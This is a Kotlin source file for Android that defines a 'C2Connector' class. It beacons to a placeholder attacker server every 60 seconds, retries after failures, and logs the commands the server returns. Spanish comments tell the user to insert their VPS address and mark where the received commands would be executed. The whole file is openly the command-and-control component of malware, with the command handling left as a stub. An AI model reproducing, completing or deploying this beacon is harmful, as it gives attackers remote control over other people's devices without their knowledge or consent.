package com.phantom.os.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.net.URL

class C2Connector(private val context: Context) {

    companion object {
        const val TAG = "C2Connector"
        // Cambia esto por la IP de tu servidor VPS o dominio
        private const val SERVER_URL = "http://TU_IP_SERVIDOR:8080/api/v1/checkin" 
    }

    private val client = OkHttpClient()
    private var job: Job? = null

    fun startListening() {
        Log.d(TAG, "📡 Starting C2 Listener...")
        checkIn()
    }

    private fun checkIn() {
        val request = Request.Builder()
            .url(SERVER_URL)
            .get()
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "❌ Connection failed", e)
                // Reintentar en 30 segundos
                retryConnection(30000L)
            }

            override fun onResponse(call: Call, response: Response) {
                response.body?.string()?.let { payload ->
                    Log.d(TAG, "✅ Received command: $payload")
                    // Aquí procesarías los comandos recibidos
                }
                // Siguiente check-in en 60 segundos
                retryConnection(60000L)
            }
        })
    }

    private fun retryConnection(delayMs: Long) {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            kotlinx.coroutines.delay(delayMs)
            checkIn()
        }
    }

    fun stopListening() {
        job?.cancel()
        Log.d(TAG, "🔌 C2 Listener Stopped")
    }
}
